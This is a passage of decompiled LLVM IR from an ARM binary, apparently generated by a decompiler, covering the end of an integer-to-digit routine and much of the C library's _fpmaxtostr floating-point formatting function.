  store i32 %v6_f1d0, i32* %r6.global-to-local, align 4
  %v19_f1d0 = icmp eq i32 %v6_f1d0, 0
  store i1 %v19_f1d0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f1e4

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1bc, %entry
  br label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f1c8, %dec_label_pc_f1dc
  %storemerge = phi i8 [ 0, %dec_label_pc_f1dc ], [ 1, %dec_label_pc_f1c8 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_f1ec = load i32, i32* %r7.global-to-local, align 4
  %v2_f1f4 = udiv i32 -1, %v0_f1ec
  store i32 %v2_f1f4, i32* %fp.global-to-local, align 4
  %v2_f204 = urem i32 -1, %v0_f1ec
  %v1_f208 = add i32 %v2_f204, 1
  store i32 %v1_f208, i32* %sb.global-to-local, align 4
  %v9_f20c = icmp eq i32 %v1_f208, %v0_f1ec
  store i1 %v9_f20c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f20c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1e4
  %v1_f210 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_f210, i32* %sb.global-to-local, align 4
  %v2_f214 = add i32 %v2_f1f4, 1
  store i32 %v2_f214, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1e4, %bb
  %v0_f218 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_f218, i32* %sl.global-to-local, align 4
  %v0_f21c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f21c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f220

dec_label_pc_f220thread-pre-split:                ; preds = %bb21
  %v0_f220.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_f228.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f220thread-pre-split, %.thread
  %v0_f290 = phi i32 [ %v0_f228.pre, %dec_label_pc_f220thread-pre-split ], [ %v0_f1ec, %.thread ]
  %v0_f23c = phi i32 [ %v0_f220.pr, %dec_label_pc_f220thread-pre-split ], [ %v0_f218, %.thread ]
  %v2_f220 = icmp eq i32 %v0_f23c, 0
  store i1 %v2_f220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f220, label %dec_label_pc_f28c, label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %dec_label_pc_f220
  %v2_f230 = urem i32 %v0_f23c, %v0_f290
  %v2_f240 = udiv i32 %v0_f23c, %v0_f290
  store i32 %v2_f240, i32* %sl.global-to-local, align 4
  %v0_f24c = load i32, i32* %r6.global-to-local, align 4
  %v2_f250 = urem i32 %v0_f24c, %v0_f290
  %v1_f258 = load i32, i32* %sb.global-to-local, align 4
  %v3_f258 = mul i32 %v1_f258, %v2_f230
  %v4_f258 = add i32 %v3_f258, %v2_f250
  store i32 %v4_f258, i32* %r5.global-to-local, align 4
  %v2_f260 = udiv i32 %v0_f24c, %v0_f290
  %v0_f268 = load i32, i32* %fp.global-to-local, align 4
  %v3_f268 = mul i32 %v0_f268, %v2_f230
  %v4_f268 = add i32 %v3_f268, %v2_f260
  %v2_f270 = udiv i32 %v4_f258, %v0_f290
  %v2_f278 = add i32 %v4_f268, %v2_f270
  br label %dec_label_pc_f2ac

dec_label_pc_f28c:                                ; preds = %dec_label_pc_f220
  %v0_f28c = load i32, i32* %r6.global-to-local, align 4
  %v2_f2a4 = udiv i32 %v0_f28c, %v0_f290
  br label %dec_label_pc_f2ac

dec_label_pc_f2ac:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f28c
  %storemerge24 = phi i32 [ %v2_f2a4, %dec_label_pc_f28c ], [ %v2_f278, %dec_label_pc_f230 ]
  %v0_f2c8 = phi i32 [ %v2_f2a4, %dec_label_pc_f28c ], [ %v2_f278, %dec_label_pc_f230 ]
  %v1_f2c8 = phi i32 [ 0, %dec_label_pc_f28c ], [ %v2_f240, %dec_label_pc_f230 ]
  %v4_f258.pn = phi i32 [ %v0_f28c, %dec_label_pc_f28c ], [ %v4_f258, %dec_label_pc_f230 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_f2b4 = urem i32 %v4_f258.pn, %v0_f290
  %v3_f2ac = load i32, i32* %stack_var_0, align 4
  %v2_f2b0 = icmp ugt i32 %v0_f2b4, 8
  %v7_f2b0 = icmp eq i32 %v0_f2b4, 9
  store i1 %v7_f2b0, i1* %cpsr_z.global-to-local, align 1
  %v1_f2b8 = add i32 %v0_f2b4, 48
  %v0_f2c0 = load i32, i32* %r8.global-to-local, align 4
  %v1_f2c0 = add i32 %v0_f2c0, -1
  store i32 %v1_f2c0, i32* %r8.global-to-local, align 4
  %v2_f2c4 = xor i1 %v7_f2b0, true
  %v3_f2c4 = and i1 %v2_f2b0, %v2_f2c4
  %extract.t = trunc i32 %v1_f2b8 to i8
  br i1 %v3_f2c4, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_f2ac
  %v2_f2b4 = add i32 %v3_f2ac, %v0_f2b4
  %extract.t8 = trunc i32 %v2_f2b4 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_f2ac, %bb20
  %v0_f2cc.off0 = phi i8 [ %extract.t, %dec_label_pc_f2ac ], [ %extract.t8, %bb20 ]
  %v2_f2c8 = or i32 %v0_f2c8, %v1_f2c8
  %v4_f2c8 = icmp eq i32 %v2_f2c8, 0
  store i1 %v4_f2c8, i1* %cpsr_z.global-to-local, align 1
  %v3_f2cc = inttoptr i32 %v1_f2c0 to i8*
  store i8 %v0_f2cc.off0, i8* %v3_f2cc, align 1
  %v0_f2d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f2d0, label %dec_label_pc_f2d4, label %dec_label_pc_f220thread-pre-split

dec_label_pc_f2d4:                                ; preds = %bb21
  %v2_f2d4 = load i8, i8* %stack_var_-40, align 1
  %v2_f2d8 = icmp eq i8 %v2_f2d4, 0
  store i1 %v2_f2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2d8, label %dec_label_pc_f2d4..thread2_crit_edge, label %bb22

dec_label_pc_f2d4..thread2_crit_edge:             ; preds = %dec_label_pc_f2d4
  %v0_f2e4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_f2d4
  %v3_f2e0 = load i32, i32* %r8.global-to-local, align 4
  %v4_f2e0 = add i32 %v3_f2e0, -1
  %v5_f2e0 = inttoptr i32 %v4_f2e0 to i8*
  store i8 45, i8* %v5_f2e0, align 1
  %v6_f2e0 = load i32, i32* %r8.global-to-local, align 4
  %v7_f2e0 = add i32 %v6_f2e0, -1
  store i32 %v7_f2e0, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f2d4..thread2_crit_edge, %bb22
  %v0_f2e4 = phi i32 [ %v0_f2e4.pre, %dec_label_pc_f2d4..thread2_crit_edge ], [ %v7_f2e0, %bb22 ]
  ret i32 %v0_f2e4

; uselistorder directives
  uselistorder i32 %v0_f2b4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_f290, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_f2ac, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f1e4, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp183 = bitcast float %tmp to i32
  store i32 %tmp183, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f2f0 = load i32, i32* @r4, align 4
  store i32 %v3_f2f0, i32* %stack_var_-36, align 4
  %v1_f2f4 = add i32 %arg4, 8
  %v2_f2f4 = inttoptr i32 %v1_f2f4 to i8*
  %v3_f2f4 = load i8, i8* %v2_f2f4, align 1
  %v4_f2f4 = zext i8 %v3_f2f4 to i32
  store i32 %v4_f2f4, i32* %sl.global-to-local, align 4
  store i32 %arg4, i32* %stack_var_-200, align 4
  %v1_f300 = or i32 %v4_f2f4, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f304 = icmp ult i32 %v1_f300, 97
  store i1 %v6_f304, i1* %cpsr_n.global-to-local, align 1
  %v7_f304 = icmp eq i32 %v1_f300, 97
  store i1 %v7_f304, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %tmp183, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_f318 = inttoptr i32 %arg4 to i32*
  %v2_f318 = load i32, i32* %v1_f318, align 4
  store i32 %v2_f318, i32* %r1.global-to-local, align 4
  br i1 %v7_f304, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_f31c = add nuw nsw i32 %v4_f2f4, 6
  store i32 %v2_f31c, i32* %r3.global-to-local, align 4
  %v2_f324 = urem i32 %v2_f31c, 256
  store i32 %v2_f324, i32* %sl.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %v2_f318, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  %v1_f33c = add i32 %arg4, 12
  %v2_f33c = inttoptr i32 %v1_f33c to i32*
  %v3_f33c = load i32, i32* %v2_f33c, align 4
  store i32 %v3_f33c, i32* %r2.global-to-local, align 4
  %v1_f340 = add i32 %arg4, 4
  %v2_f340 = inttoptr i32 %v1_f340 to i32*
  %v3_f340 = load i32, i32* %v2_f340, align 4
  store i32 %v3_f340, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f344 = icmp slt i32 %v2_f318, 0
  store i1 %v1_f344, i1* %cpsr_n.global-to-local, align 1
  %v2_f344 = icmp eq i32 %v2_f318, 0
  store i1 %v2_f344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_f344, label %bb223, label %bb224

bb223:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %.thread, %bb223
  %v1_f6a4 = phi i32 [ %v2_f318, %.thread ], [ 6, %bb223 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f350 = and i32 %v3_f33c, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f350 = icmp eq i32 %v1_f350, 0
  store i1 %v2_f350, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_f350, label %dec_label_pc_f368, label %dec_label_pc_f374

dec_label_pc_f368:                                ; preds = %bb224
  %v1_f368 = urem i32 %v3_f33c, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f368 = icmp eq i32 %v1_f368, 0
  store i1 %v2_f368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f368, label %dec_label_pc_f378, label %dec_label_pc_f374

dec_label_pc_f374:                                ; preds = %dec_label_pc_f368, %bb224
  %storemerge = phi i32 [ 43, %bb224 ], [ 32, %dec_label_pc_f368 ]
  %v0_f374.off0 = phi i8 [ 43, %bb224 ], [ 32, %dec_label_pc_f368 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_f374.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_f378

dec_label_pc_f378:                                ; preds = %dec_label_pc_f368, %dec_label_pc_f374
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r2.global-to-local, align 4
  %v7_f394 = fcmp ord double %arg2, 0.000000e+00
  %not.v7_f394 = xor i1 %v7_f394, true
  %v9_f394 = sext i1 %not.v7_f394 to i32
  store i32 %v9_f394, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %not.v7_f394, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_f394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f394, label %dec_label_pc_f3a8, label %bb226

bb226:                                            ; preds = %dec_label_pc_f378
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f45c

dec_label_pc_f3a8:                                ; preds = %dec_label_pc_f378
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_f3b8 = fcmp ogt double %arg2, 0.000000e+00
  %v7_f3b8 = fcmp oeq double %arg2, 0.000000e+00
  %v8_f3b8 = select i1 %v6_f3b8, i32 1, i32 -1
  %v9_f3b8 = select i1 %v7_f3b8, i32 0, i32 %v8_f3b8
  store i32 %v9_f3b8, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f3bc = icmp slt i32 %v9_f3b8, 0
  store i1 %v1_f3bc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_f3b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b8, label %dec_label_pc_f3c4, label %bb227

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f3a8
  %v10_f3d4 = fdiv double 0x3FF000003FD00000, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_f3e0 = fcmp ogt double %v10_f3d4, 0.000000e+00
  %v7_f3e0 = zext i1 %v6_f3e0 to i32
  store i32 %v7_f3e0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f3e4 = icmp eq i1 %v6_f3e0, false
  store i1 %v2_f3e4, i1* %cpsr_z.global-to-local, align 1
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f5cc

bb227:                                            ; preds = %dec_label_pc_f3a8
  %v10_f43c = fmul double %arg2, 0x3FD00000000155A4
  %v11_f43c = fptrunc double %v10_f43c to float
  %v12_f43c = bitcast float %v11_f43c to i32
  store i32 %v12_f43c, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v6_f450 = fcmp olt double %v10_f43c, %arg2
  %v7_f450 = fcmp oeq double %v10_f43c, %arg2
  %v8_f450 = select i1 %v6_f450, i32 1, i32 -1
  %v9_f450 = select i1 %v7_f450, i32 0, i32 %v8_f450
  store i32 %v9_f450, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f454 = icmp slt i32 %v9_f450, 0
  store i1 %v1_f454, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_f450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f450, label %dec_label_pc_f45c, label %dec_label_pc_f4a0

dec_label_pc_f45c:                                ; preds = %bb226, %bb227
  %v0_f38c.v1_f3a08 = phi i32 [ 0, %bb227 ], [ 8, %bb226 ]
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v2_f464 = add i32 %arg4, 16
  %v3_f464 = inttoptr i32 %v2_f464 to i32*
  store i32 32, i32* %v3_f464, align 4
  %v0_f46c = load i32, i32* %sl.global-to-local, align 4
  %v1_f46c = add i32 %v0_f46c, -96
  %v3_f46c = sub i32 95, %v0_f46c
  %v4_f46c = and i32 %v3_f46c, %v0_f46c
  %v5_f46c = icmp slt i32 %v4_f46c, 0
  store i1 %v5_f46c, i1* %cpsr_v.global-to-local, align 1
  %v6_f46c = icmp slt i32 %v1_f46c, 0
  store i1 %v6_f46c, i1* %cpsr_n.global-to-local, align 1
  %v7_f46c = icmp eq i32 %v0_f46c, 96
  store i1 %v7_f46c, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp286 = icmp ult i32 %v0_f46c, 97
  br i1 %tmp286, label %bb228, label %.thread127

bb228:                                            ; preds = %dec_label_pc_f45c
  %v5_f480 = or i32 %v0_f38c.v1_f3a08, 4
  store i32 %v5_f480, i32* %r3.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_f45c, %bb228
  %v4_f484 = phi i32 [ %v5_f480, %bb228 ], [ 3, %dec_label_pc_f45c ]
  %v4_f484.v0_f38c.v1_f3a0 = select i1 %tmp286, i32 %v4_f484, i32 %v0_f38c.v1_f3a08
  store i32 ptrtoint ([4 x i8]* @global_var_155a4.669 to i32), i32* %r2.global-to-local, align 4
  %v2_f490 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_f490, i32* %r6.global-to-local, align 4
  %v2_f494 = add i32 %v4_f484.v0_f38c.v1_f3a0, ptrtoint ([4 x i8]* @global_var_155a4.669 to i32)
  store i32 %v2_f494, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9d8

dec_label_pc_f4a0:                                ; preds = %bb227
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f570

dec_label_pc_f570:                                ; preds = %dec_label_pc_f570, %dec_label_pc_f4a0
  %v0_f578 = phi i32 [ 256, %dec_label_pc_f4a0 ], [ %v3_f578, %dec_label_pc_f570 ]
  %v0_f534 = phi i32 [ %tmp183, %dec_label_pc_f4a0 ], [ %v11_f53c, %dec_label_pc_f570 ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_f4a0 ], [ %v2_f560, %dec_label_pc_f570 ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_f4a0 ], [ %v1_f4d4, %dec_label_pc_f570 ]
  %v1_f4d4 = add nsw i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_155b8.672 to i32), i32* %r2.global-to-local, align 4
  %v3_f4e8 = mul i32 %v1_f4d4, 8
  store i32 %v3_f4e8, i32* %r3.global-to-local, align 4
  store i32 %v0_f534, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v2_f4f4 = add i32 %v3_f4e8, ptrtoint (i32* @global_var_155b8.672 to i32)
  store i32 %v2_f4f4, i32* %ip.global-to-local, align 4
  %v1_f4fc = inttoptr i32 %v2_f4f4 to i32*
  %v2_f4fc = load i32, i32* %v1_f4fc, align 4
  %v3_f4fc = sext i32 %v2_f4fc to i64
  %v1_f534 = sext i32 %v0_f534 to i64
  %v2_f534 = bitcast i64 %v1_f534 to double
  %v8_f53c = bitcast i64 %v3_f4fc to double
  %v9_f53c = fdiv double %v2_f534, %v8_f53c
  %v10_f53c = fptrunc double %v9_f53c to float
  %v11_f53c = bitcast float %v10_f53c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v11_f53c, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  %v6_f550 = fcmp ogt double %v9_f53c, 0x4CBEBC20
  %v7_f550 = zext i1 %v6_f550 to i32
  store i32 %v7_f550, i32* %r0.global-to-local, align 4
  %v2_f560 = add i32 %stack_var_-192.2, %v0_f578
  store i32 %v2_f560, i32* %r1.global-to-local, align 4
  store i32 %v11_f53c, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %v1_f4d4, i32* %r2.global-to-local, align 4
  %v2_f574 = icmp eq i32 %v1_f4d4, 0
  %v3_f578 = sdiv i32 %v0_f578, 2
  br i1 %v2_f574, label %dec_label_pc_f580, label %dec_label_pc_f570

dec_label_pc_f580:                                ; preds = %dec_label_pc_f570
  %v6_f590 = fcmp ogt double %v9_f53c, 0x4E6E6B2A
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f594 = icmp eq i1 %v6_f590, false
  store i1 %v2_f594, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 1092616194, i32* %r2.global-to-local, align 4
  %v10_f5b4 = fdiv double %v9_f53c, 0x4024000041F00000
  %v11_f5b4 = fptrunc double %v10_f5b4 to float
  %v12_f5b4 = bitcast float %v11_f5b4 to i32
  store i32 %v12_f5b4, i32* %r0.global-to-local, align 4
  store i32 520, i32* %r3.global-to-local, align 4
  store i32 %v12_f5b4, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f5cc

dec_label_pc_f5cc:                                ; preds = %dec_label_pc_f3c4, %dec_label_pc_f580
  %v0_f5d873 = phi i32 [ %tmp183, %dec_label_pc_f3c4 ], [ %v12_f5b4, %dec_label_pc_f580 ]
  %stack_var_-192.6 = phi i32 [ -1, %dec_label_pc_f3c4 ], [ 520, %dec_label_pc_f580 ]
  %v2_f5cc = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_f5cc, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_f5d4

dec_label_pc_f5d4:                                ; preds = %dec_label_pc_f668.dec_label_pc_f5d4_crit_edge, %dec_label_pc_f5cc
  %v0_f60c = phi i32 [ %v0_f5d8.pre, %dec_label_pc_f668.dec_label_pc_f5d4_crit_edge ], [ %v0_f5d873, %dec_label_pc_f5cc ]
  %v0_f610 = phi i32 [ %v0_f5d4.pre, %dec_label_pc_f668.dec_label_pc_f5d4_crit_edge ], [ %arg3, %dec_label_pc_f5cc ]
  store i32 %v0_f610, i32* %r1.global-to-local, align 4
  %v1_f5dc = sext i32 %v0_f60c to i64
  %v2_f5dc = bitcast i64 %v1_f5dc to double
  %v3_f5dc = fptoui double %v2_f5dc to i32
  store i32 %v3_f5dc, i32* %r4.global-to-local, align 4
  store i32 %v3_f5dc, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f5e8 = icmp slt i32 %v3_f5dc, 0
  store i1 %v1_f5e8, i1* %cpsr_n.global-to-local, align 1
  %v2_f5e8 = icmp eq i32 %v3_f5dc, 0
  store i1 %v2_f5e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f610, i32* %r3.global-to-local, align 4
  br i1 %v1_f5e8, label %dec_label_pc_f5f8, label %dec_label_pc_f60c

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f5d4
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F00000000155A7) to float) to i32), i32* %r0.global-to-local, align 4
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F00000000155A7) to float) to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_f610, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f60c

dec_label_pc_f60c:                                ; preds = %dec_label_pc_f5d4, %dec_label_pc_f5f8
  store i32 %v0_f60c, i32* @r0, align 4
  store i32 %v0_f610, i32* %r1.global-to-local, align 4
  %v1_f614 = fptrunc double %v2_f5dc to float
  %v2_f614 = bitcast float %v1_f614 to i32
  %v4_f614 = call i32 @__aeabi_dsub(i32 %v2_f614, i32 %v0_f610)
  %v5_f614 = sext i32 %v4_f614 to i64
  store i32 1315859242, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f620 = bitcast i64 %v5_f614 to double
  %v9_f620 = fmul double %v3_f620, 0x41CDCD6540240000
  %v10_f620 = fptrunc double %v9_f620 to float
  %v11_f620 = bitcast float %v10_f620 to i32
  store i32 %v11_f620, i32* %r0.global-to-local, align 4
  %v0_f624 = load i32, i32* %sb.global-to-local, align 4
  %v1_f624 = add i32 %v0_f624, 9
  store i32 %v1_f624, i32* %sb.global-to-local, align 4
  store i32 %v11_f620, i32* %r6.global-to-local, align 4
  store i32 %v0_f610, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_f634.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f634

dec_label_pc_f634:                                ; preds = %dec_label_pc_f634.dec_label_pc_f634_crit_edge, %dec_label_pc_f60c
  %v1_f648 = phi i32 [ %v1_f648.pre, %dec_label_pc_f634.dec_label_pc_f634_crit_edge ], [ %v1_f624, %dec_label_pc_f60c ]
  %v0_f640 = phi i32 [ %v0_f65c, %dec_label_pc_f634.dec_label_pc_f634_crit_edge ], [ 0, %dec_label_pc_f60c ]
  %v0_f64c = phi i32 [ %v2_f658, %dec_label_pc_f634.dec_label_pc_f634_crit_edge ], [ %v0_f634.pre, %dec_label_pc_f60c ]
  %v2_f63c = urem i32 %v0_f64c, 10
  %v1_f640 = add i32 %v0_f640, 1
  store i32 %v1_f640, i32* %r5.global-to-local, align 4
  %v1_f644 = or i32 %v2_f63c, 48
  store i32 %v1_f644, i32* %r2.global-to-local, align 4
  %v2_f648 = sub i32 %v1_f648, %v1_f640
  store i32 %v2_f648, i32* %r3.global-to-local, align 4
  store i32 %v0_f64c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_f654 = trunc i32 %v1_f644 to i8
  %v3_f654 = inttoptr i32 %v2_f648 to i8*
  store i8 %v1_f654, i8* %v3_f654, align 1
  %v0_f658 = load i32, i32* %r0.global-to-local, align 4
  %v1_f658 = load i32, i32* %r1.global-to-local, align 4
  %v2_f658 = udiv i32 %v0_f658, %v1_f658
  store i32 %v2_f658, i32* %r0.global-to-local, align 4
  %v0_f65c = load i32, i32* %r5.global-to-local, align 4
  %v1_f65c = add i32 %v0_f65c, -8
  %v3_f65c = sub i32 7, %v0_f65c
  %v4_f65c = and i32 %v3_f65c, %v0_f65c
  %v5_f65c = icmp slt i32 %v4_f65c, 0
  store i1 %v5_f65c, i1* %cpsr_v.global-to-local, align 1
  %v6_f65c = icmp slt i32 %v1_f65c, 0
  store i1 %v6_f65c, i1* %cpsr_n.global-to-local, align 1
  %v7_f65c = icmp eq i32 %v0_f65c, 8
  store i1 %v7_f65c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_f658, i32* %r4.global-to-local, align 4
  %v7_f664 = icmp slt i32 %v0_f65c, 9
  br i1 %v7_f664, label %dec_label_pc_f634.dec_label_pc_f634_crit_edge, label %dec_label_pc_f668

dec_label_pc_f634.dec_label_pc_f634_crit_edge:    ; preds = %dec_label_pc_f634
  %v1_f648.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_f634

dec_label_pc_f668:                                ; preds = %dec_label_pc_f634
  %v0_f668 = load i32, i32* %r8.global-to-local, align 4
  %v1_f668 = add i32 %v0_f668, 1
  store i32 %v1_f668, i32* %r8.global-to-local, align 4
  %v3_f66c = sub i32 -1, %v0_f668
  %v4_f66c = and i32 %v1_f668, %v3_f66c
  %v5_f66c = icmp slt i32 %v4_f66c, 0
  store i1 %v5_f66c, i1* %cpsr_v.global-to-local, align 1
  %v6_f66c = icmp slt i32 %v0_f668, 0
  store i1 %v6_f66c, i1* %cpsr_n.global-to-local, align 1
  %v7_f66c = icmp eq i32 %v0_f668, 0
  store i1 %v7_f66c, i1* %cpsr_z.global-to-local, align 1
